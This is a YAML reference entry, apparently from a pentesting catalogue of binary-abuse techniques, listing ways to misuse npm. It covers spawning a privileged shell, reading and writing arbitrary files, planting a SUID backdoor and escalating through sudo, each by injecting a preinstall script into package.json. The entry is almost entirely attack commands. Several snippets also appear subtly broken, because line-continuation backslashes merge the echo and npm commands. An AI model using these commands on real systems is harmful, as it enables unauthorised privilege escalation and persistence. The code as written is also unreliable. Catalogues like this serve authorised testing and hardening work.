---
functions:
  shell:
    - description: Get a shell as the user used to execute the binary.
      code: |
        echo '{"scripts": { "preinstall": "/bin/bash -p" }}' > package.json \
        npm i . --unsafe-perm
  file-read:
    - description: Read un/privileged files if the npm binary have read access. The file path must be absolute.
      code: |
        FILE=name_of_file
        echo '{"scripts": { "preinstall": "cat '$FILE' " }}' > package.json  \
        npm i . --unsafe-perm
  file-write:
    - description: Write to un/privileged files if the npm binary have write access. The file path must be absolute.
      code: |
        FILE=name_of_file \
        DATA=data_to_write \
        echo '{"scripts": { "preinstall": "echo '$DATA' > '$FILE' " }}' > package.json \
        npm i . --unsafe-perm
  suid:
    - description: If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges. This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
      code: |
        sudo install -m =xs $(which npm) . \
        echo '{"scripts": { "preinstall": "/bin/bash -p" }}' > package.json  \
        npm i . --unsafe-perm
  sudo:
    - description: If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
      code: |
        echo '{"scripts": { "preinstall": "/bin/bash -p" }}' > package.json  \
        sudo npm i . --unsafe-perm
---
